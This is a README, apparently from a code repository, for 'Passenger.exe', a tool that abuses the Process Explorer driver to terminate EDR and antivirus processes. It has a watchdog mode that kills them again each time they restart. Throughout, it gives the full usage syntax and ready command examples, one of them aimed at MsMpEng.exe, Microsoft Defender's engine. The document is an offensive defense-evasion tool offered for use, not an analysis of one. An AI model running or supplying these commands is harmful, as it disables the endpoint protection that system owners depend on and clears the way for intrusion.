Utilizing Proccess Explorer Driver to kill EDR's.

The tool has 2 modes:
  1. Kill the EDR's process.
  2. Kill the EDR's process and keep watching if the process up again, if does - kill it.
 
 ```batch
C:\> C:\Users\Windy\source\repos\Passenger\x64\Release\Passenger.exe

Usage: Passenger.exe { /install <DRIVER_FILE_FULL_PATH> || /service <SERVICE_NAME>} {/pid <PID> || /name <PROCNAME.exe>} [/watchdog]

=== Help ===
/install - Full Path to the Driver file to be install.
/service -
        With /install - Arbitrary name for the new service
        Without /install - An existing service name (Will start the service if needed)
/pid - Target Process Id
/name - Target Process Name
/watchdog - Monitor the service, if it comes up again - kill it

=== Examples ===
[!] Load driver at C:\driver.sys as service with the name nonsense and kill process with id 123
Passenger.exe /install C:\driver.sys /service nonsense /pid 123

[!] Start the service nonsense and kill process with name MsMpEng.exe
Passenger.exe /service nonsense /name MsMpEng.exe

[!] Start the service nonsense and kill process with id 123. Keep monitor the process (By its name), kill it everytime it is up again
Passenger.exe /service nonsense /pid 123 /watchdog
```

# Credits
This tool is inspired by `Alejandro Pinna` and based on his amazing work https://github.com/waawaa/breakcyserver
